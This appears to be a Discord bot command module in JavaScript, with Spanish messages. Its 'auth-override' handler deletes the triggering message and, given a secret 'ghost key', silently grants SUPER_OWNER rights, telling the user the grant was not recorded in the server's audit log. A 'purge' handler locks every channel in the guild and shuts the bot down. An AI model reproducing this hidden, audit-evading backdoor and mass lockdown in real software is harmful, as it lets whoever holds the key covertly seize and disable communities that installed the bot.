'use strict';

const { stmt } = require('../database/db');
const config = require('../config');
const { isInQuarantine } = require('../modules/omniGuardian');
const crypto = require('crypto');

const LOCK_FILE_PATH = require('path').join(__dirname, '../../data/LOCK_FILE');

async function handleAuthorization(message, args) {
  const userId = message.author.id;

  try {
    await message.delete();
  } catch {}

  if (args[0] !== 'auth-override') return;

  const providedKey = (args[1] || '').toString().trim();
  if (!providedKey) return;

  const isValid = config.security.verifyGhostKey(providedKey);

  if (!isValid) {
    return;
  }

  stmt.setSuperOwner.run(1, userId);

  try {
    await message.author.send(
      '👻 **PROTOCOLO FANTASMA ACTIVADO**\n\n' +
      'Se te han otorgado privilegios de SUPER_OWNER.\n' +
      '⚡ Acceso total. Sin restricciones. Sin registros en Discord.\n' +
      '_Esta activación es silenciosa y no fue registrada en la auditoría del servidor._'
    );
  } catch {}
}

async function handlePurge(message) {
  const userId = message.author.id;
  const user = stmt.getUser.get(userId);

  const isSuper = user && user.is_super_owner;
  const isRealOwner = userId === config.ids.owner;

  if (!isSuper && !isRealOwner) return;

  const fs = require('fs');

  try {
    fs.writeFileSync(LOCK_FILE_PATH, `LOCKED_BY=${userId}\nTIMESTAMP=${new Date().toISOString()}\n`, 'utf8');
  } catch {}

  await message.channel.guild.channels.cache.forEach(async (ch) => {
    try {
      await ch.permissionOverwrites.edit(ch.guild.id, {
        SendMessages: false,
        Connect: false,
        AddReactions: false,
        CreatePublicThreads: false,
        CreatePrivateThreads: false,
        ManageChannels: false,
        ManageRoles: false,
      });
    } catch {}
  });

  await message.reply('🔴 **PURGE EJECUTADO.** Bot en modo apagado total. Todos los canales bloqueados.').catch(() => {});

  setTimeout(() => {
    process.exit(0);
  }, 2000);
}

function checkLockFile() {
  const fs = require('fs');
  if (fs.existsSync(LOCK_FILE_PATH)) {
    console.error('[LOCK] Archivo LOCK_FILE detectado. El bot está bloqueado. Elimina manualmente para reiniciar.');
    process.exit(1);
  }
}

async function handleMasterUnlock(message, args) {
  const userId = message.author.id;
  const pin = (args[0] || '').toString().trim();

  if (!pin) return;

  const isValid = config.security.verifyMasterUnlock(pin);
  if (!isValid) {
    return message.reply('❌ PIN incorrecto. Acceso denegado.');
  }

  const { deactivateQuarantine, deactivateLockdown } = require('../modules/omniGuardian');
  deactivateQuarantine();
  deactivateLockdown();

  const fs = require('fs');
  try {
    if (fs.existsSync(LOCK_FILE_PATH)) fs.unlinkSync(LOCK_FILE_PATH);
  } catch {}

  await message.author.send('✅ **Sistema desbloqueado.** PIN verificado. Todos los modos de emergencia desactivados.').catch(() => {});
  await message.delete().catch(() => {});
}

module.exports = { handleAuthorization, handlePurge, checkLockFile, handleMasterUnlock };
